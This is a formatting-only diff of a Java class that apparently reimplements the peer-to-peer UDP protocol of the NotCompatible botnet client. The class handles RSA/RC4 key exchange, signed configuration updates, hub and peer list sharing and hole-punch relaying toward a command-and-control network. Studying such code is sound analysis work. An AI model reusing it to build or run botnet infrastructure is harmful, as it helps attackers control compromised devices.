@@ -15,124 +15,124 @@ import diff.notcompatible.c.bot.objects.Packet;
 
 public class UDPPoint {
 
-	private final static Logger LOGGER = Logger.getLogger("session");
-	
-	public byte[] rc4key;
-	public InetSocketAddress endPoint;
-	public boolean isEncrypt;
-	public boolean isPunch;
-	public long lastChangeTime;
-	public UDPRemPointList remlist;
-	public byte keepByte;
-	public HubListItem hr;
-	public UDPMixer owner;
-	public int seq;
-	public UDPQuery query;
-	public long longCheckTime;
-	public LinkStatus status;
-	public boolean sendSUIPAfter;
+    private final static Logger LOGGER = Logger.getLogger("session");
 
-	public UDPPoint(UDPMixer newOwner) {
-		owner = newOwner;
-		remlist = new UDPRemPointList();
-		query = new UDPQuery(this);
-		rc4key = new byte[100];
-		sendSUIPAfter = false;
-		status = LinkStatus.OFFLINE;
-	}
+    public byte[] rc4key;
+    public InetSocketAddress endPoint;
+    public boolean isEncrypt;
+    public boolean isPunch;
+    public long lastChangeTime;
+    public UDPRemPointList remlist;
+    public byte keepByte;
+    public HubListItem hr;
+    public UDPMixer owner;
+    public int seq;
+    public UDPQuery query;
+    public long longCheckTime;
+    public LinkStatus status;
+    public boolean sendSUIPAfter;
 
-	public void onReadySeq(byte[] data) {
+    public UDPPoint(UDPMixer newOwner) {
+        owner = newOwner;
+        remlist = new UDPRemPointList();
+        query = new UDPQuery(this);
+        rc4key = new byte[100];
+        sendSUIPAfter = false;
+        status = LinkStatus.OFFLINE;
+    }
+
+    public void onReadySeq(byte[] data) {
         MyBuffer buffer = new MyBuffer();
         buffer.put(data);
         Packet packet = Packet.unpack(buffer);
         if (packet != null) {
             if (packet.tag.equals("SUIP")) {
                 recvSUIP(packet);
-            }else if (packet.tag.equals("PING")) {
+            } else if (packet.tag.equals("PING")) {
                 sendPONG();
-            }else if (packet.tag.equals("PONG")) {
+            } else if (packet.tag.equals("PONG")) {
                 recvPONG(packet);
-            }else if (packet.tag.equals("PINGME")) {
+            } else if (packet.tag.equals("PINGME")) {
                 recvPINGME(packet);
-            }else if (packet.tag.equals("PINGTO")) {
+            } else if (packet.tag.equals("PINGTO")) {
                 recvPINGTO(packet);
-            }else if (packet.tag.equals("SET")) {
+            } else if (packet.tag.equals("SET")) {
                 recvSET(packet);
-            }else if (packet.tag.equals("GETSET")) {
+            } else if (packet.tag.equals("GETSET")) {
                 sendSET();
-            }else if (packet.tag.equals("LID")) {
+            } else if (packet.tag.equals("LID")) {
                 recvLID(packet);
-            }else if (packet.tag.equals("GETHUB")) {
+            } else if (packet.tag.equals("GETHUB")) {
                 sendHUBList();
-            }else if (packet.tag.equals("UDPHUBLIST")) {
+            } else if (packet.tag.equals("UDPHUBLIST")) {
                 recvHUBLIST(packet);
-            }else if (packet.tag.equals("GETPOINT")) {
+            } else if (packet.tag.equals("GETPOINT")) {
                 sendList();
-            }else if (packet.tag.equals("PUSH")) {
+            } else if (packet.tag.equals("PUSH")) {
                 recvPUSH(packet);
-            }else if (packet.tag.equals("LIST")) {
+            } else if (packet.tag.equals("LIST")) {
                 recvLIST(packet);
-            }else if (packet.tag.equals("PUSHTO")) {
+            } else if (packet.tag.equals("PUSHTO")) {
                 recvPUSHTO(packet);
-            }else {
-            	LOGGER.warning(" [!] Hit an unknown UDP command!");
+            } else {
+                LOGGER.warning(" [!] Hit an unknown UDP command!");
             }
-        }
-	}
-	
-    public void onRecv(byte[] data) {
-        byte[] payloadContents = new byte[data.length - 1];
-        System.arraycopy(data, 1, payloadContents, 0, payloadContents.length);
-        
-        // Check command byte
-        switch (data[0]) {
-            case (byte) 0:
-                recvPublic(payloadContents);
-                lastChangeTime = System.currentTimeMillis();
-                break;
-            case (byte) 1:
-                recvRC4key(payloadContents);
-                lastChangeTime = System.currentTimeMillis();
-                break;
-            case (byte) 2:
-                if (isEncrypt) {
-                    query.postData(payloadContents);
-                    lastChangeTime = System.currentTimeMillis();
-                } else {
-                    sendPublic();
-                }
-            	break;
-            case (byte) 3:
-                isPunch = false;
-                sendPublic();
-                break;
-            case (byte) 4:
-                isPunch = false;
-                break;
-            default:
-                owner.list.delete(this);
         }
     }
 
-	public void check() {
-		if (isPunch) {
+    public void onRecv(byte[] data) {
+        byte[] payloadContents = new byte[data.length - 1];
+        System.arraycopy(data, 1, payloadContents, 0, payloadContents.length);
+
+        // Check command byte
+        switch (data[0]) {
+        case (byte) 0:
+            recvPublic(payloadContents);
+            lastChangeTime = System.currentTimeMillis();
+            break;
+        case (byte) 1:
+            recvRC4key(payloadContents);
+            lastChangeTime = System.currentTimeMillis();
+            break;
+        case (byte) 2:
+            if (isEncrypt) {
+                query.postData(payloadContents);
+                lastChangeTime = System.currentTimeMillis();
+            } else {
+                sendPublic();
+            }
+            break;
+        case (byte) 3:
+            isPunch = false;
+            sendPublic();
+            break;
+        case (byte) 4:
+            isPunch = false;
+            break;
+        default:
+            owner.list.delete(this);
+        }
+    }
+
+    public void check() {
+        if (isPunch) {
             sendKEEP();
         } else {
             query.check();
-            if (lastChangeTime + 30000 > longCheckTime && isEncrypt) {
+            if (((lastChangeTime + 30000) > longCheckTime) && isEncrypt) {
                 sendPING();
             }
-           
-			if (longCheckTime + 40000 < System.currentTimeMillis()) {
+
+            if ((longCheckTime + 40000) < System.currentTimeMillis()) {
                 longCheckTime = System.currentTimeMillis();
-                if (remlist.candidateCount() == 0 && isEncrypt) {
+                if ((remlist.candidateCount() == 0) && isEncrypt) {
                     sendGETPOINT();
                 }
             }
         }
-	}
+    }
 
-	public void doDelete(boolean good) {
+    public void doDelete(boolean good) {
         if (hr != null) {
             if (good) {
                 hr.status = 1;
@@ -142,28 +142,29 @@ public class UDPPoint {
             hr.used = false;
         }
         owner.list.delete(this);
-	}
-	
-	public void recvPublic(byte[] data){
-		LOGGER.info(" [+] Receiving a public key over UDP");
+    }
+
+    public void recvPublic(byte[] data) {
+        LOGGER.info(" [+] Receiving a public key over UDP");
         RSA remoteClientsRSA = new RSA();
         if (remoteClientsRSA.loadPublic(data)) {
             byte[] tmpRC4Data = new byte[101];
-            for(int i = 0; i < tmpRC4Data.length; i++)
+            for (int i = 0; i < tmpRC4Data.length; i++) {
                 tmpRC4Data[i] = (byte) ((int) Math.round(Math.random() * 256.0d));
+            }
             tmpRC4Data[0] = (byte) 0x7;
             System.arraycopy(tmpRC4Data, 1, rc4key, 0, rc4key.length);
-            
+
             byte[] encryptedRC4Key = remoteClientsRSA.encrypt(tmpRC4Data);
             if (encryptedRC4Key == null) {
                 owner.list.delete(this);
             } else {
-            	MyBuffer buffer = new MyBuffer();
-            	
+                MyBuffer buffer = new MyBuffer();
+
                 buffer.put((byte) 1);
                 buffer.put(encryptedRC4Key);
                 send(buffer.array());
-                
+
                 status = LinkStatus.ONLINE;
                 isEncrypt = true;
                 if (owner.owner.udpList.count() < 1000) {
@@ -174,10 +175,10 @@ public class UDPPoint {
         } else {
             doDelete(false);
         }
-	}
-	
-	public void recvRC4key(byte[] data){
-		LOGGER.info(" [+] Receiving a rc4 key over UDP");
+    }
+
+    public void recvRC4key(byte[] data) {
+        LOGGER.info(" [+] Receiving a rc4 key over UDP");
         rc4key = owner.owner.RSALocal.decrypt(data);
 
         byte[] decryptedRC4Key = new byte[100];
@@ -196,18 +197,20 @@ public class UDPPoint {
         if (owner.owner.udpList.count() < 1000) {
             sendGETHUB();
         }
-	}
-	
-	public void recvSET(Packet packet){
-		LOGGER.info(" [+] Receiving a SETing packet over UDP");
+    }
+
+    public void recvSET(Packet packet) {
+        LOGGER.info(" [+] Receiving a SETing packet over UDP");
         Packet dataPacket = packet.getByName("DATA");
         if (dataPacket != null) {
-        	Packet signPacket = packet.getByName("Sign");
+            Packet signPacket = packet.getByName("Sign");
             if (signPacket != null) {
-            	Packet lidPacket = dataPacket.getByName("LID");
-                if (lidPacket != null && owner.owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() < lidPacket.asInt64()
-                		&& owner.owner.RSAGlobal.check(dataPacket.getDigest(), signPacket.array())) {
-                	owner.owner.config.packet.delete("SET");
+                Packet lidPacket = dataPacket.getByName("LID");
+                if ((lidPacket != null)
+                                && (owner.owner.config.packet.getByName("SET").getByName("DATA").getByName("LID")
+                                                .asInt64() < lidPacket.asInt64())
+                                && owner.owner.RSAGlobal.check(dataPacket.getDigest(), signPacket.array())) {
+                    owner.owner.config.packet.delete("SET");
                     owner.owner.config.packet.add(packet);
                     owner.owner.config.save(owner.owner.sessionDirectory);
                     owner.owner.connectionManager.load();
@@ -215,35 +218,35 @@ public class UDPPoint {
                 }
             }
         }
-	}
-	
-	public void recvHUBLIST(Packet packet){
+    }
+
+    public void recvHUBLIST(Packet packet) {
         owner.owner.udpList.loadFromPacket(packet);
         owner.owner.saveUDPHubList();
-	}
-	
-	public void recvPONG(Packet packet){
-		LOGGER.info(" [+] Received a PONG over UDP");
-		// Nothing
-	}
-	
-	public void recvPINGME(Packet packet){
-		LOGGER.info(" [+] Received a PINGME over UDP");
+    }
+
+    public void recvPONG(Packet packet) {
+        LOGGER.info(" [+] Received a PONG over UDP");
+        // Nothing
+    }
+
+    public void recvPINGME(Packet packet) {
+        LOGGER.info(" [+] Received a PINGME over UDP");
         Packet pingToPacket = new Packet();
         pingToPacket.tag = "PINGTO";
         pingToPacket.buffer.putIP(endPoint.getAddress().getHostAddress());
         pingToPacket.buffer.putPort(endPoint.getPort());
-    	for(int i = 0; i < owner.list.count(); i++) {
+        for (int i = 0; i < owner.list.count(); i++) {
             UDPPoint up = owner.list.getByIndex(i);
-            if (up != this && up.isEncrypt) {
+            if ((up != this) && up.isEncrypt) {
                 up.send(pingToPacket);
                 return;
             }
         }
-	}
-	
-	public void recvPINGTO(Packet packet){
-		LOGGER.info(" [+] Received a PINGTO over UDP");
+    }
+
+    public void recvPINGTO(Packet packet) {
+        LOGGER.info(" [+] Received a PINGTO over UDP");
         if (packet.buffer.size == 6) {
             String ip = packet.asIP();
             packet.buffer.shift(4);
@@ -256,42 +259,43 @@ public class UDPPoint {
                 }
             }
         }
-	}
-	
-	public void recvSUIP(Packet packet){
-		LOGGER.info(" [+] Received a SUIP over UDP");
-		long currentTime = System.currentTimeMillis();
-		String ip = packet.asIP();
-		packet.buffer.shift(4);
-		int port = packet.asPort();
-		
-		owner.owner.IPDetected(ip);
-		HubListItem item = owner.owner.udpList.getByIpAndPort(ip, port);
-		if(item == null) {
-			item = owner.owner.udpList.add();
-			item.ip = ip;
-			item.port = port;
-		}
-		
-		item.connectCount = 0;
-		item.lastConnect = currentTime;
-		item.lastTested = currentTime;
-		item.status = 1;
-		item.used = true;
-	}
-	
-	public void recvLID(Packet packet){
-		LOGGER.info(" [+] Received a LID over UDP");
+    }
+
+    public void recvSUIP(Packet packet) {
+        LOGGER.info(" [+] Received a SUIP over UDP");
+        long currentTime = System.currentTimeMillis();
+        String ip = packet.asIP();
+        packet.buffer.shift(4);
+        int port = packet.asPort();
+
+        owner.owner.IPDetected(ip);
+        HubListItem item = owner.owner.udpList.getByIpAndPort(ip, port);
+        if (item == null) {
+            item = owner.owner.udpList.add();
+            item.ip = ip;
+            item.port = port;
+        }
+
+        item.connectCount = 0;
+        item.lastConnect = currentTime;
+        item.lastTested = currentTime;
+        item.status = 1;
+        item.used = true;
+    }
+
+    public void recvLID(Packet packet) {
+        LOGGER.info(" [+] Received a LID over UDP");
         if (owner.owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() < packet.asInt64()) {
             sendGetSET();
-        }else if (owner.owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() > packet.asInt64()) {
+        } else if (owner.owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() > packet
+                        .asInt64()) {
             sendSET();
         }
-	}
-	
-	public void recvLIST(Packet packet){
-		LOGGER.info(" [+] Received a LIST over UDP");
-		for(int i = 0; i < packet.getCount(); i ++) {
+    }
+
+    public void recvLIST(Packet packet) {
+        LOGGER.info(" [+] Received a LIST over UDP");
+        for (int i = 0; i < packet.getCount(); i++) {
             Packet item = packet.getByIndex(i);
             if (item.tag.equals("Item")) {
                 String ip = item.asIP();
@@ -299,10 +303,10 @@ public class UDPPoint {
                 remlist.add(new InetSocketAddress(ip, item.asPort()));
             }
         }
-	}
-	
-	public void recvPUSHTO(Packet packet){
-		LOGGER.info(" [+] Received a PUSHTO over UDP");
+    }
+
+    public void recvPUSHTO(Packet packet) {
+        LOGGER.info(" [+] Received a PUSHTO over UDP");
         if (packet.buffer.size == 6) {
             String ip = packet.asIP();
             packet.buffer.shift(4);
@@ -316,119 +320,119 @@ public class UDPPoint {
                 }
             }
         }
-	}
-	
-	public void recvPUSH(Packet packet){
-		LOGGER.info(" [+] Received a PUSH over UDP");
+    }
+
+    public void recvPUSH(Packet packet) {
+        LOGGER.info(" [+] Received a PUSH over UDP");
         if (packet.buffer.size == 6) {
             String ip = packet.asIP();
             packet.buffer.shift(4);
             UDPPoint up = owner.list.getByInetSocketAddress(new InetSocketAddress(ip, packet.asPort()));
-            if (up != null && up.isEncrypt) {
+            if ((up != null) && up.isEncrypt) {
                 up.sendPUSHTO(endPoint.getAddress().getHostAddress(), endPoint.getPort());
             }
         }
-	}
+    }
 
-	public void sendGETHUB() {
-		LOGGER.info(" [+] Sending a GETHUB over UDP");
-		Packet packet = new Packet();
-		packet.tag = "GETHUB";
-		send(packet);
-	}
-	
-	public void sendGETPOINT() {
-		LOGGER.info(" [+] Sending a GETPOINT over UDP");
-		Packet packet = new Packet();
-		packet.tag = "GETPOINT";
-		send(packet);
-	}
-	
-	public void sendGetSET() {
-		LOGGER.info(" [+] Sending a GetSET over UDP");
-		Packet packet = new Packet();
-		packet.tag = "GETSET";
-		send(packet);
-	}
+    public void sendGETHUB() {
+        LOGGER.info(" [+] Sending a GETHUB over UDP");
+        Packet packet = new Packet();
+        packet.tag = "GETHUB";
+        send(packet);
+    }
 
-	public void sendSUIP() {
-		LOGGER.info(" [+] Sending a SUIP over UDP");
+    public void sendGETPOINT() {
+        LOGGER.info(" [+] Sending a GETPOINT over UDP");
+        Packet packet = new Packet();
+        packet.tag = "GETPOINT";
+        send(packet);
+    }
+
+    public void sendGetSET() {
+        LOGGER.info(" [+] Sending a GetSET over UDP");
+        Packet packet = new Packet();
+        packet.tag = "GETSET";
+        send(packet);
+    }
+
+    public void sendSUIP() {
+        LOGGER.info(" [+] Sending a SUIP over UDP");
         MyBuffer buffer = new MyBuffer();
         Packet packet = new Packet();
-        
+
         buffer.putIP(endPoint.getAddress().getHostAddress());
         buffer.putPort(endPoint.getPort());
         packet.tag = "SUIP";
         packet.buffer.put(buffer.array());
-        
-        send(packet);
-	}
-	
-	public void sendPUSH(String hostAddress, long port) {
-		LOGGER.info(" [+] Sending a PUSH over UDP");
-		MyBuffer buffer = new MyBuffer();
-		buffer.putIP(hostAddress);
-		buffer.putPort(port);
-		
-		Packet packet = new Packet();
-		packet.tag = "PUSH";
-		packet.buffer =  buffer;
-		
-		send(packet);
-	}
-	
-	public void sendPUSHTO(String hostAddress, long port) {
-		LOGGER.info(" [+] Sending a PUSHTO over UDP");
-		MyBuffer buffer = new MyBuffer();
-		buffer.putIP(hostAddress);
-		buffer.putPort(port);
-		
-		Packet packet = new Packet();
-		packet.tag = "PUSHTO";
-		packet.buffer =  buffer;
-		
-		send(packet);
-	}
 
-	public void sendKEEP() {
-		LOGGER.info(" [+] Sending a KEEP over UDP");
+        send(packet);
+    }
+
+    public void sendPUSH(String hostAddress, long port) {
+        LOGGER.info(" [+] Sending a PUSH over UDP");
+        MyBuffer buffer = new MyBuffer();
+        buffer.putIP(hostAddress);
+        buffer.putPort(port);
+
+        Packet packet = new Packet();
+        packet.tag = "PUSH";
+        packet.buffer = buffer;
+
+        send(packet);
+    }
+
+    public void sendPUSHTO(String hostAddress, long port) {
+        LOGGER.info(" [+] Sending a PUSHTO over UDP");
+        MyBuffer buffer = new MyBuffer();
+        buffer.putIP(hostAddress);
+        buffer.putPort(port);
+
+        Packet packet = new Packet();
+        packet.tag = "PUSHTO";
+        packet.buffer = buffer;
+
+        send(packet);
+    }
+
+    public void sendKEEP() {
+        LOGGER.info(" [+] Sending a KEEP over UDP");
         byte[] data = new byte[1];
         data[0] = keepByte;
         send(data);
-	}
-	
-	public void sendPONG() {
-		LOGGER.info(" [+] Sending a PONG over UDP");
-		Packet packet = new Packet();
-		packet.tag = "PONG";
-		send(packet);
-	}
-	
-	public void sendPING() {
-		LOGGER.info(" [+] Sending a PING over UDP");
-		Packet packet = new Packet();
-		packet.tag = "PING";
-		send(packet);
-	}
-	
-	public void sendPINGME() {
-		LOGGER.info(" [+] Sending a PINGME over UDP");
-		Packet packet = new Packet();
-		packet.tag = "PINGME";
-		send(packet);
-	}
-	
-	public void sendHUBList() {
-		LOGGER.info(" [+] Sending a HUBList over UDP");
-		send(owner.owner.udpList.getHubListFordSend());
-	}
-	
-	public void sendList() {
-		LOGGER.info(" [+] Sending a List over UDP");
+    }
+
+    public void sendPONG() {
+        LOGGER.info(" [+] Sending a PONG over UDP");
+        Packet packet = new Packet();
+        packet.tag = "PONG";
+        send(packet);
+    }
+
+    public void sendPING() {
+        LOGGER.info(" [+] Sending a PING over UDP");
+        Packet packet = new Packet();
+        packet.tag = "PING";
+        send(packet);
+    }
+
+    public void sendPINGME() {
+        LOGGER.info(" [+] Sending a PINGME over UDP");
+        Packet packet = new Packet();
+        packet.tag = "PINGME";
+        send(packet);
+    }
+
+    public void sendHUBList() {
+        LOGGER.info(" [+] Sending a HUBList over UDP");
+        send(owner.owner.udpList.getHubListFordSend());
+    }
+
+    public void sendList() {
+        LOGGER.info(" [+] Sending a List over UDP");
         Packet listPacket = new Packet();
         listPacket.tag = "LIST";
-        
-        for(int i = 0; i < owner.count(); i++) {
+
+        for (int i = 0; i < owner.count(); i++) {
             UDPPoint udpPoint = owner.list.getByIndex(i);
             if (udpPoint.isEncrypt) {
                 Packet pointPacket = listPacket.add();
@@ -437,25 +441,25 @@ public class UDPPoint {
                 pointPacket.buffer.putPort(udpPoint.endPoint.getPort());
             }
         }
-        
-        send(listPacket);
-	}
-	
-	public void sendSET() {
-		LOGGER.info(" [+] Sending a SET over UDP");
-		send(owner.owner.config.packet.getByName("SET"));
-	}
 
-	public void sendLID() {
-		LOGGER.info(" [+] Sending a LID over UDP");
+        send(listPacket);
+    }
+
+    public void sendSET() {
+        LOGGER.info(" [+] Sending a SET over UDP");
+        send(owner.owner.config.packet.getByName("SET"));
+    }
+
+    public void sendLID() {
+        LOGGER.info(" [+] Sending a LID over UDP");
         Packet packet = new Packet();
         packet.tag = "LID";
         packet.buffer.putInt64(owner.owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64());
         send(packet);
-	}
+    }
 
-	public void sendPublic() {
-		LOGGER.info(" [+] Sending a Public key over UDP");
+    public void sendPublic() {
+        LOGGER.info(" [+] Sending a Public key over UDP");
         byte[] modulus = owner.owner.RSALocal.rsaPublicKey.getModulus().toByteArray();
         if (modulus[0] == 0x00) {
             byte[] tmp = new byte[(modulus.length - 1)];
@@ -465,21 +469,21 @@ public class UDPPoint {
         MyBuffer buffer = new MyBuffer();
         buffer.put((byte) 0);
         buffer.put(modulus);
-        
+
         send(buffer.array());
         status = LinkStatus.KEY_EXCHANGE_START;
-	}
-	
+    }
+
     public void send(Packet packet) {
         UDPHeader header = new UDPHeader();
         MyBuffer buffer = new MyBuffer();
         MyBuffer ot = new MyBuffer();
-        
+
         buffer.put(packet.pack());
         seq++;
         header.sequence = seq;
         header.part = (buffer.size + 499) / 500;
-        for(int i = 1; i <= header.part; i++) {
+        for (int i = 1; i <= header.part; i++) {
             byte[] r = buffer.read(500);
             if (r.length > 0) {
                 header.count = i;
@@ -490,7 +494,7 @@ public class UDPPoint {
             }
         }
     }
-	
+
     public void send(byte[] data) {
         ByteBuffer tmp = ByteBuffer.allocate(data.length);
         tmp.put(data);
@@ -498,28 +502,28 @@ public class UDPPoint {
         try {
             owner.channel.send(tmp, endPoint);
         } catch (IOException exception) {
-        	exception.printStackTrace();
+            exception.printStackTrace();
         }
     }
 
     public void sendEncrypt(byte[] data) {
         RC4 rc4 = new RC4(rc4key);
         ByteBuffer tmp = ByteBuffer.allocate(data.length + 1);
-        
+
         tmp.put((byte) 2);
         tmp.put(rc4.crypt(data));
         tmp.position(0);
         try {
             owner.channel.send(tmp, endPoint);
         } catch (IOException exception) {
-        	exception.printStackTrace();
+            exception.printStackTrace();
         }
     }
 
     public static enum LinkStatus {
-    	OFFLINE, // No connection
-    	KEY_EXCHANGE_START, // Connection started, need crypto
-    	KEY_EXCHANGE_DONE, // Key sent to C&C
-    	ONLINE // Key exchange done and valid
+        OFFLINE, // No connection
+        KEY_EXCHANGE_START, // Connection started, need crypto
+        KEY_EXCHANGE_DONE, // Key sent to C&C
+        ONLINE // Key exchange done and valid
     }
 }
